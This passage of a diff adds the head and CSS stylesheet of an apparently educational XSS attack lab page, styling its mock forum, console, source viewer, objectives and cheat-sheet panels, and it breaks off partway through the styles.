@@ -1,0 +1,2840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control: Dark Arts vault requires all 5 gates -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievement tracking -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attack Lab — EHE // Dark Arts</title>
+    <link rel="icon" data-desc="Biohazard favicon for Dark Arts labs" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x2623;</text></svg>">
+    <style>
+        /* ─── Reset & Base ─── */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            /* Dark Arts purple palette */
+            --bg-base:        #0a0508;
+            --bg-panel:       #0f0812;
+            --bg-card:        #120a18;
+            --bg-input:       #0d0710;
+            --border-dim:     rgba(100, 60, 130, 0.15);
+            --border-mid:     rgba(147, 51, 234, 0.25);
+            --border-bright:  rgba(147, 51, 234, 0.5);
+            --accent:         #9333ea;
+            --accent-light:   #a855f7;
+            --accent-glow:    rgba(147, 51, 234, 0.3);
+            --text-bright:    #c4a0d8;
+            --text-mid:       #9a7aaa;
+            --text-dim:       #6a4a7a;
+            --text-faint:     #3a2a4a;
+            --green:          #22c55e;
+            --green-dim:      rgba(34, 197, 94, 0.15);
+            --red:            #ef4444;
+            --red-dim:        rgba(239, 68, 68, 0.12);
+            --amber:          #f59e0b;
+            --amber-dim:      rgba(245, 158, 11, 0.12);
+            --console-bg:     #050a05;
+            --console-green:  #39ff14;
+            --console-dim:    #22aa0e;
+            --source-bg:      #04080d;
+            --source-blue:    #60a5fa;
+            --source-purple:  #c084fc;
+            --source-green:   #4ade80;
+            --source-amber:   #fbbf24;
+            --source-red:     #f87171;
+            --forum-bg:       #0c0914;
+            --forum-border:   rgba(80, 40, 110, 0.2);
+        }
+
+        body {
+            min-height: 100vh;
+            background: var(--bg-base);
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: var(--text-mid);
+            overflow-x: hidden;
+        }
+
+        /* Atmospheric radial gradient overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 20% 10%, rgba(80, 30, 120, 0.07) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 85%, rgba(60, 20, 100, 0.05) 0%, transparent 55%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ─── Header ─── */
+        .lab-header {
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            padding: 14px 32px;
+            background: rgba(10, 5, 15, 0.96);
+            border-bottom: 1px solid var(--border-dim);
+            backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            min-width: 0;
+        }
+
+        .back-btn {
+            color: var(--text-dim);
+            text-decoration: none;
+            font-size: 0.75rem;
+            letter-spacing: 0.1em;
+            padding: 5px 12px;
+            border: 1px solid var(--border-dim);
+            border-radius: 4px;
+            transition: color 0.2s, border-color 0.2s, background 0.2s;
+            white-space: nowrap;
+            font-family: 'Georgia', serif;
+        }
+
+        .back-btn:hover {
+            color: var(--accent-light);
+            border-color: var(--border-bright);
+            background: rgba(147, 51, 234, 0.06);
+        }
+
+        .header-title-group {
+            min-width: 0;
+        }
+
+        .lab-badge {
+            font-size: 0.6rem;
+            letter-spacing: 0.25em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-bottom: 2px;
+        }
+
+        .lab-title {
+            font-size: 0.95rem;
+            color: var(--text-bright);
+            letter-spacing: 0.04em;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-shrink: 0;
+        }
+
+        /* Score display in header */
+        .score-display {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+
+        .score-label {
+            font-size: 0.55rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+        }
+
+        .score-value {
+            font-size: 1.1rem;
+            color: var(--accent-light);
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+            transition: color 0.3s;
+        }
+
+        .score-value.penalty {
+            animation: scorePenalty 0.4s ease-out;
+        }
+
+        @keyframes scorePenalty {
+            0%   { color: var(--red); transform: scale(1.15); }
+            100% { color: var(--accent-light); transform: scale(1); }
+        }
+
+        /* Objectives counter */
+        .obj-counter {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+
+        .obj-label {
+            font-size: 0.55rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+        }
+
+        .obj-value {
+            font-size: 0.85rem;
+            color: var(--text-mid);
+            font-family: 'Courier New', monospace;
+        }
+
+        .obj-value span {
+            color: var(--green);
+            font-weight: bold;
+        }
+
+        /* ─── Ethical Warning Banner ─── */
+        .warning-banner {
+            background: rgba(245, 158, 11, 0.06);
+            border: 1px solid rgba(245, 158, 11, 0.18);
+            border-radius: 6px;
+            padding: 10px 18px;
+            margin: 20px 24px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .warning-icon {
+            font-size: 1rem;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .warning-text {
+            font-size: 0.75rem;
+            color: rgba(245, 158, 11, 0.7);
+            line-height: 1.5;
+            font-family: 'Courier New', monospace;
+        }
+
+        .warning-text strong {
+            color: var(--amber);
+        }
+
+        /* ─── Main Layout ─── */
+        .lab-layout {
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            grid-template-rows: auto 1fr;
+            gap: 0;
+            height: calc(100vh - 57px - 54px); /* subtract header + warning banner */
+            position: relative;
+            z-index: 10;
+        }
+
+        /* ─── Left Column: Forum + Console ─── */
+        .left-col {
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--border-dim);
+            overflow: hidden;
+        }
+
+        /* ─── Challenge Tabs ─── */
+        .challenge-tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border-dim);
+            background: rgba(8, 4, 12, 0.9);
+            flex-shrink: 0;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 10px 8px;
+            border: none;
+            background: transparent;
+            color: var(--text-dim);
+            font-family: 'Courier New', monospace;
+            font-size: 0.68rem;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: color 0.2s, border-color 0.2s, background 0.2s;
+            position: relative;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-mid);
+            background: rgba(147, 51, 234, 0.04);
+        }
+
+        .tab-btn.active {
+            color: var(--accent-light);
+            border-bottom-color: var(--accent);
+            background: rgba(147, 51, 234, 0.06);
+        }
+
+        .tab-btn .tab-check {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--text-faint);
+            margin-right: 6px;
+            vertical-align: middle;
+            transition: background 0.3s;
+        }
+
+        .tab-btn.challenge-complete .tab-check {
+            background: var(--green);
+            box-shadow: 0 0 6px rgba(34, 197, 94, 0.5);
+        }
+
+        /* ─── Forum Area ─── */
+        .forum-area {
+            flex: 1;
+            overflow-y: auto;
+            background: var(--forum-bg);
+        }
+
+        /* Scrollbar styling */
+        .forum-area::-webkit-scrollbar,
+        .console-output::-webkit-scrollbar,
+        .source-panel::-webkit-scrollbar,
+        .objectives-list::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .forum-area::-webkit-scrollbar-track,
+        .console-output::-webkit-scrollbar-track,
+        .source-panel::-webkit-scrollbar-track,
+        .objectives-list::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .forum-area::-webkit-scrollbar-thumb,
+        .console-output::-webkit-scrollbar-thumb,
+        .source-panel::-webkit-scrollbar-thumb,
+        .objectives-list::-webkit-scrollbar-thumb {
+            background: var(--border-dim);
+            border-radius: 2px;
+        }
+
+        /* ─── Forum chrome (fake browser chrome) ─── */
+        .browser-chrome {
+            background: rgba(6, 3, 10, 0.95);
+            border-bottom: 1px solid rgba(60, 35, 80, 0.3);
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            z-index: 5;
+        }
+
+        .browser-dots {
+            display: flex;
+            gap: 5px;
+        }
+
+        .browser-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .browser-dot.red   { background: #ff5f56; }
+        .browser-dot.amber { background: #ffbd2e; }
+        .browser-dot.green { background: #27c93f; }
+
+        .browser-url {
+            flex: 1;
+            background: rgba(30, 15, 45, 0.6);
+            border: 1px solid rgba(60, 35, 80, 0.4);
+            border-radius: 4px;
+            padding: 3px 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            color: var(--text-dim);
+        }
+
+        /* ─── Forum content styles ─── */
+        .forum-content {
+            padding: 16px 20px 24px;
+        }
+
+        .forum-header {
+            padding: 12px 20px;
+            border-bottom: 1px solid var(--forum-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(10, 5, 16, 0.7);
+        }
+
+        .forum-logo {
+            font-size: 0.9rem;
+            color: var(--text-bright);
+            letter-spacing: 0.05em;
+        }
+
+        .forum-logo span {
+            color: var(--accent-light);
+        }
+
+        .forum-nav {
+            display: flex;
+            gap: 16px;
+        }
+
+        .forum-nav-item {
+            font-family: 'Courier New', monospace;
+            font-size: 0.65rem;
+            color: var(--text-dim);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .forum-nav-item:hover,
+        .forum-nav-item.active {
+            color: var(--accent-light);
+        }
+
+        /* Search bar (Challenge 1) */
+        .search-section {
+            margin-bottom: 20px;
+        }
+
+        .search-bar-wrap {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .forum-search-input {
+            flex: 1;
+            background: var(--bg-input);
+            border: 1px solid var(--border-dim);
+            border-radius: 4px;
+            padding: 8px 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.82rem;
+            color: var(--text-bright);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .forum-search-input:focus {
+            border-color: var(--border-mid);
+        }
+
+        .forum-search-input::placeholder {
+            color: var(--text-faint);
+        }
+
+        .forum-btn {
+            padding: 8px 16px;
+            background: rgba(147, 51, 234, 0.12);
+            border: 1px solid var(--border-mid);
+            border-radius: 4px;
+            color: var(--accent-light);
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        .forum-btn:hover {
+            background: rgba(147, 51, 234, 0.22);
+            border-color: var(--border-bright);
+        }
+
+        /* Search results area */
+        .search-results {
+            background: rgba(8, 4, 12, 0.5);
+            border: 1px solid var(--forum-border);
+            border-radius: 4px;
+            padding: 12px 14px;
+            min-height: 42px;
+        }
+
+        .search-results-heading {
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            color: var(--text-mid);
+            margin-bottom: 10px;
+        }
+
+        /* Where the reflected payload renders — innerHTML is used intentionally
+           for simulation purposes only; input is matched against known patterns
+           and never eval'd. The rendered content is display-only. */
+        .search-results-heading .reflected-output {
+            color: var(--text-bright);
+            word-break: break-all;
+        }
+
+        .search-result-item {
+            padding: 8px 0;
+            border-top: 1px solid var(--forum-border);
+        }
+
+        .result-title {
+            font-size: 0.82rem;
+            color: var(--accent-light);
+            margin-bottom: 3px;
+        }
+
+        .result-snippet {
+            font-size: 0.72rem;
+            color: var(--text-dim);
+            line-height: 1.4;
+        }
+
+        /* Forum posts */
+        .forum-post-card {
+            background: rgba(10, 5, 16, 0.5);
+            border: 1px solid var(--forum-border);
+            border-radius: 6px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+        }
+
+        .post-meta {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .post-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #6a2d9a, #3a1a5a);
+            border: 1px solid var(--border-dim);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.65rem;
+            color: var(--text-mid);
+            flex-shrink: 0;
+            font-family: 'Courier New', monospace;
+        }
+
+        .post-author {
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            color: var(--text-mid);
+        }
+
+        .post-time {
+            font-family: 'Courier New', monospace;
+            font-size: 0.65rem;
+            color: var(--text-faint);
+            margin-left: auto;
+        }
+
+        .post-title {
+            font-size: 0.88rem;
+            color: var(--text-bright);
+            margin-bottom: 6px;
+        }
+
+        .post-body {
+            font-size: 0.77rem;
+            color: var(--text-dim);
+            line-height: 1.55;
+        }
+
+        /* Comment section (Challenge 2) */
+        .comment-section {
+            margin-top: 16px;
+        }
+
+        .section-divider {
+            font-family: 'Courier New', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-bottom: 12px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid var(--forum-border);
+        }
+
+        /* Comment form */
+        .comment-form {
+            background: rgba(8, 4, 12, 0.4);
+            border: 1px solid var(--forum-border);
+            border-radius: 6px;
+            padding: 12px 14px;
+            margin-bottom: 14px;
+        }
+
+        .comment-form-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .form-field {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .form-label {
+            font-family: 'Courier New', monospace;
+            font-size: 0.62rem;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+        }
+
+        .forum-input {
+            background: var(--bg-input);
+            border: 1px solid var(--border-dim);
+            border-radius: 3px;
+            padding: 6px 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            color: var(--text-bright);
+            outline: none;
+            transition: border-color 0.2s;
+            width: 100%;
+        }
+
+        .forum-input:focus {
+            border-color: var(--border-mid);
+        }
+
+        .forum-textarea {
+            background: var(--bg-input);
+            border: 1px solid var(--border-dim);
+            border-radius: 3px;
+            padding: 6px 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            color: var(--text-bright);
+            outline: none;
+            transition: border-color 0.2s;
+            width: 100%;
+            resize: vertical;
+            min-height: 60px;
+        }
+
+        .forum-textarea:focus {
+            border-color: var(--border-mid);
+        }
+
+        .submit-btn {
+            padding: 6px 16px;
+            background: rgba(147, 51, 234, 0.12);
+            border: 1px solid var(--border-mid);
+            border-radius: 4px;
+            color: var(--accent-light);
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+            margin-top: 6px;
+        }
+
+        .submit-btn:hover {
+            background: rgba(147, 51, 234, 0.22);
+            border-color: var(--border-bright);
+        }
+
+        /* Comment items */
+        .comment-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .comment-item {
+            background: rgba(8, 4, 12, 0.4);
+            border: 1px solid var(--forum-border);
+            border-radius: 4px;
+            padding: 10px 12px;
+        }
+
+        .comment-item.injected {
+            border-color: rgba(239, 68, 68, 0.25);
+            background: rgba(239, 68, 68, 0.04);
+        }
+
+        .comment-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+
+        .comment-author {
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            color: var(--text-mid);
+        }
+
+        .comment-time {
+            font-family: 'Courier New', monospace;
+            font-size: 0.62rem;
+            color: var(--text-faint);
+            margin-left: auto;
+        }
+
+        .comment-body {
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        /* XSS payload indicator tag on comment */
+        .xss-tag {
+            display: inline-block;
+            font-family: 'Courier New', monospace;
+            font-size: 0.58rem;
+            letter-spacing: 0.08em;
+            padding: 1px 6px;
+            background: rgba(239, 68, 68, 0.12);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+            border-radius: 3px;
+            color: #f87171;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        /* DOM XSS profile page */
+        .profile-page {
+            padding: 0;
+        }
+
+        .profile-card {
+            background: rgba(10, 5, 16, 0.5);
+            border: 1px solid var(--forum-border);
+            border-radius: 6px;
+            padding: 18px 16px;
+            margin-bottom: 14px;
+        }
+
+        .profile-greeting {
+            font-size: 1rem;
+            color: var(--text-bright);
+            margin-bottom: 8px;
+        }
+
+        .profile-greeting-render {
+            color: var(--accent-light);
+        }
+
+        .profile-info {
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            line-height: 1.5;
+        }
+
+        /* DOM XSS URL input simulator */
+        .dom-url-sim {
+            background: rgba(8, 4, 12, 0.4);
+            border: 1px solid var(--forum-border);
+            border-radius: 6px;
+            padding: 14px;
+            margin-bottom: 14px;
+        }
+
+        .dom-label {
+            font-family: 'Courier New', monospace;
+            font-size: 0.65rem;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-bottom: 8px;
+        }
+
+        .dom-url-bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-dim);
+            border-radius: 4px;
+            padding: 6px 10px;
+            margin-bottom: 8px;
+        }
+
+        .dom-url-prefix {
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            color: var(--text-faint);
+            white-space: nowrap;
+        }
+
+        .dom-fragment-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            color: var(--accent-light);
+        }
+
+        .dom-go-btn {
+            padding: 5px 12px;
+            background: rgba(147, 51, 234, 0.12);
+            border: 1px solid var(--border-mid);
+            border-radius: 4px;
+            color: var(--accent-light);
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .dom-go-btn:hover {
+            background: rgba(147, 51, 234, 0.22);
+        }
+
+        .dom-code-note {
+            font-family: 'Courier New', monospace;
+            font-size: 0.68rem;
+            color: var(--text-faint);
+            line-height: 1.5;
+        }
+
+        .dom-code-snippet {
+            display: inline;
+            color: var(--source-amber);
+        }
+
+        /* ─── Browser Console Panel ─── */
+        .console-panel {
+            flex-shrink: 0;
+            height: 200px;
+            display: flex;
+            flex-direction: column;
+            border-top: 1px solid var(--border-dim);
+            background: var(--console-bg);
+        }
+
+        .console-toolbar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 5px 12px;
+            background: rgba(5, 10, 5, 0.95);
+            border-bottom: 1px solid rgba(30, 60, 30, 0.3);
+            flex-shrink: 0;
+        }
+
+        .console-label {
+            font-family: 'Courier New', monospace;
+            font-size: 0.62rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: rgba(57, 255, 20, 0.5);
+        }
+
+        .console-clear-btn {
+            margin-left: auto;
+            background: transparent;
+            border: 1px solid rgba(57, 255, 20, 0.15);
+            border-radius: 3px;
+            color: rgba(57, 255, 20, 0.3);
+            font-family: 'Courier New', monospace;
+            font-size: 0.6rem;
+            padding: 2px 8px;
+            cursor: pointer;
+            transition: color 0.2s, border-color 0.2s;
+        }
+
+        .console-clear-btn:hover {
+            color: var(--console-green);
+            border-color: rgba(57, 255, 20, 0.4);
+        }
+
+        .console-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.76rem;
+            line-height: 1.6;
+        }
+
+        .console-line {
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+            padding: 1px 0;
+            border-bottom: none;
+            opacity: 0;
+            animation: consoleFadeIn 0.3s ease forwards;
+        }
+
+        @keyframes consoleFadeIn {
+            from { opacity: 0; transform: translateX(-4px); }
+            to   { opacity: 1; transform: translateX(0); }
+        }
+
+        .console-prefix {
+            color: rgba(57, 255, 20, 0.35);
+            flex-shrink: 0;
+            user-select: none;
+        }
+
+        .console-text {
+            color: var(--console-dim);
+            word-break: break-all;
+        }
+
+        /* Console line type variants */
+        .console-line.type-info    .console-prefix { color: rgba(57, 255, 20, 0.35); }
+        .console-line.type-info    .console-text   { color: var(--console-dim); }
+        .console-line.type-alert   .console-prefix { color: #f59e0b; }
+        .console-line.type-alert   .console-text   { color: #fbbf24; }
+        .console-line.type-xss     .console-prefix { color: #ef4444; }
+        .console-line.type-xss     .console-text   { color: #f87171; }
+        .console-line.type-success .console-prefix { color: #22c55e; }
+        .console-line.type-success .console-text   { color: #4ade80; }
+        .console-line.type-cookie  .console-prefix { color: #a855f7; }
+        .console-line.type-cookie  .console-text   { color: #c084fc; }
+        .console-line.type-network .console-prefix { color: #60a5fa; }
+        .console-line.type-network .console-text   { color: #93c5fd; }
+
+        /* ─── Right Panel (Info / Source / Objectives) ─── */
+        .right-panel {
+            display: flex;
+            flex-direction: column;
+            background: var(--bg-panel);
+            overflow: hidden;
+        }
+
+        .panel-tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border-dim);
+            background: rgba(8, 4, 12, 0.9);
+            flex-shrink: 0;
+        }
+
+        .panel-tab {
+            flex: 1;
+            padding: 9px 4px;
+            border: none;
+            background: transparent;
+            color: var(--text-faint);
+            font-family: 'Courier New', monospace;
+            font-size: 0.62rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: color 0.2s, border-color 0.2s, background 0.2s;
+        }
+
+        .panel-tab.active {
+            color: var(--accent-light);
+            border-bottom-color: var(--accent);
+            background: rgba(147, 51, 234, 0.05);
+        }
+
+        .panel-tab:hover:not(.active) {
+            color: var(--text-mid);
+        }
+
+        /* Panel content views */
+        .panel-view {
+            display: none;
+            flex: 1;
+            overflow: hidden;
+            flex-direction: column;
+        }
+
+        .panel-view.active {
+            display: flex;
+        }
+
+        /* ─── HTML Source View ─── */
+        .source-panel {
+            flex: 1;
+            overflow-y: auto;
+            padding: 14px 16px;
+            background: var(--source-bg);
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            line-height: 1.7;
+        }
+
+        /* Syntax highlight classes */
+        .src-tag    { color: var(--source-red); }
+        .src-attr   { color: var(--source-blue); }
+        .src-str    { color: var(--source-green); }
+        .src-cmt    { color: var(--text-faint); font-style: italic; }
+        .src-js     { color: var(--source-amber); }
+        .src-text   { color: var(--text-dim); }
+
+        /* Highlighted injection point */
+        .src-inject {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 2px;
+            color: #f87171;
+            padding: 0 2px;
+            animation: injectPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes injectPulse {
+            0%, 100% { background: rgba(239, 68, 68, 0.12); }
+            50%       { background: rgba(239, 68, 68, 0.25); }
+        }
+
+        /* Source section label */
+        .source-section-label {
+            font-size: 0.62rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-bottom: 10px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid rgba(30, 15, 50, 0.4);
+        }
+
+        /* ─── Objectives Panel ─── */
+        .objectives-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 14px 16px;
+        }
+
+        .obj-section-title {
+            font-family: 'Courier New', monospace;
+            font-size: 0.62rem;
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-bottom: 10px;
+            margin-top: 14px;
+        }
+
+        .obj-section-title:first-child {
+            margin-top: 0;
+        }
+
+        .objective-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 10px;
+            border-radius: 4px;
+            margin-bottom: 6px;
+            border: 1px solid transparent;
+            transition: border-color 0.3s, background 0.3s;
+        }
+
+        .objective-item.completed {
+            border-color: var(--green-dim);
+            background: rgba(34, 197, 94, 0.04);
+        }
+
+        .obj-checkbox {
+            width: 14px;
+            height: 14px;
+            border-radius: 3px;
+            border: 1px solid var(--text-faint);
+            flex-shrink: 0;
+            margin-top: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: border-color 0.3s, background 0.3s;
+        }
+
+        .objective-item.completed .obj-checkbox {
+            border-color: var(--green);
+            background: var(--green-dim);
+        }
+
+        .obj-check-icon {
+            font-size: 0.6rem;
+            color: var(--green);
+            display: none;
+        }
+
+        .objective-item.completed .obj-check-icon {
+            display: block;
+        }
+
+        .obj-text {
+            font-size: 0.76rem;
+            color: var(--text-dim);
+            line-height: 1.4;
+            transition: color 0.3s;
+        }
+
+        .objective-item.completed .obj-text {
+            color: var(--text-mid);
+        }
+
+        /* ─── Hint Panel ─── */
+        .hint-section {
+            padding: 14px 16px;
+            border-top: 1px solid var(--border-dim);
+            flex-shrink: 0;
+        }
+
+        .hint-btn {
+            width: 100%;
+            padding: 7px 14px;
+            background: rgba(245, 158, 11, 0.06);
+            border: 1px solid rgba(245, 158, 11, 0.18);
+            border-radius: 4px;
+            color: rgba(245, 158, 11, 0.6);
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            cursor: pointer;
+            text-align: left;
+            transition: background 0.2s, border-color 0.2s, color 0.2s;
+        }
+
+        .hint-btn:hover {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: rgba(245, 158, 11, 0.3);
+            color: var(--amber);
+        }
+
+        .hint-text {
+            font-family: 'Courier New', monospace;
+            font-size: 0.73rem;
+            color: rgba(245, 158, 11, 0.65);
+            line-height: 1.5;
+            margin-top: 8px;
+            padding: 8px 10px;
+            background: rgba(245, 158, 11, 0.04);
+            border-left: 2px solid rgba(245, 158, 11, 0.2);
+            display: none;
+        }
+
+        .hint-text.visible {
+            display: block;
+        }
+
+        /* ─── Payload Cheat Sheet (Collapsible, inside objectives tab) ─── */
+        .cheatsheet-toggle {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(147, 51, 234, 0.06);
+            border: 1px solid var(--border-dim);
+            border-radius: 4px;
+            padding: 8px 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.68rem;
+            color: var(--text-dim);
+            cursor: pointer;
+            margin-bottom: 0;
+            transition: background 0.2s, color 0.2s;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+
+        .cheatsheet-toggle:hover {
+            background: rgba(147, 51, 234, 0.1);
+            color: var(--text-mid);
+        }
+
+        .cheatsheet-arrow {
+            transition: transform 0.25s;
+        }
+
+        .cheatsheet-toggle.open .cheatsheet-arrow {
+            transform: rotate(180deg);
+        }
+
+        .cheatsheet-body {
+            display: none;
+            border: 1px solid var(--border-dim);
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            margin-bottom: 14px;
+        }
+
+        .cheatsheet-body.visible {
+            display: block;
+        }
+
+        .payload-category {
+            padding: 10px 12px;
+            border-bottom: 1px solid rgba(60, 30, 80, 0.15);
+        }
+
+        .payload-category:last-child {
+            border-bottom: none;
+        }
+
+        .payload-cat-label {
+            font-family: 'Courier New', monospace;
+            font-size: 0.6rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            color: var(--text-faint);
+            margin-bottom: 6px;
+        }
+
+        .payload-entry {
+            margin-bottom: 8px;
+        }
+
+        .payload-code {
+            font-family: 'Courier New', monospace;
+            font-size: 0.68rem;
+            color: var(--source-amber);
+            background: rgba(5, 3, 8, 0.7);
+            border: 1px solid rgba(60, 30, 80, 0.3);
+            border-radius: 3px;
+            padding: 3px 8px;
+            display: block;
+            word-break: break-all;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+            margin-bottom: 2px;
+        }
+
+        .payload-code:hover {
+            background: rgba(147, 51, 234, 0.08);
+            border-color: var(--border-mid);
+        }
+
+        .payload-why {
+            font-size: 0.65rem;
+            color: var(--text-faint);
+            line-height: 1.4;
+            padding-left: 4px;
+        }
+
+        /* ─── Completion Section ─── */
+        .completion-section {
+            padding: 14px 16px;
+            border-top: 1px solid var(--border-dim);
+            flex-shrink: 0;
+        }
+
+        .completion-btn {
+            width: 100%;
+            padding: 10px 18px;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.25);
+            border-radius: 5px;
+            color: rgba(34, 197, 94, 0.5);
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            cursor: not-allowed;
+            letter-spacing: 0.08em;
+            transition: background 0.3s, border-color 0.3s, color 0.3s;
+        }
+
+        .completion-btn.ready {
+            color: var(--green);
+            border-color: rgba(34, 197, 94, 0.45);
+            cursor: pointer;
+        }
+
+        .completion-btn.ready:hover {
+            background: rgba(34, 197, 94, 0.18);
+            border-color: rgba(34, 197, 94, 0.6);
+        }
+
+        .completion-note {
+            font-family: 'Courier New', monospace;
+            font-size: 0.62rem;
+            color: var(--text-faint);
+            text-align: center;
+            margin-top: 6px;
+        }
+
+        /* ─── XSS Flash Overlay ─── */
+        .xss-flash {
+            position: fixed;
+            inset: 0;
+            background: rgba(239, 68, 68, 0.08);
+            pointer-events: none;
+            z-index: 500;
+            opacity: 0;
+            transition: opacity 0.1s;
+        }
+
+        .xss-flash.active {
